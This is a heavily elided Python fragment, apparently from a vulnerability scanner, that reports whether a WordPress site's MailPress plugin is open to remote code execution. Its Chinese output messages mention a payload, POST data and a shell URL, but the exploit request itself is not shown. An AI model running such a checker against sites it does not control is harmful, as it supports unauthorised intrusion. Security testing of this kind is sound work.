...
class wordpress_plugin_mailpress_rce:
    ...
    def run(self):
        ...
        try:
            ...
            if r"Configuration File (php.ini) Path" in req2.text:
                printGreen("[+]Success:存在wordpress 插件mailpress远程代码执行漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)+"\nshellurl: "+shellurl)
            else:
                printBlue("[-]Info:不存在wordpress_plugin_mailpress_rce漏洞")
...
if __name__ == "__main__":
    ...
    testVuln = wordpress_plugin_mailpress_rce(sys.argv[1])
    testVuln.run()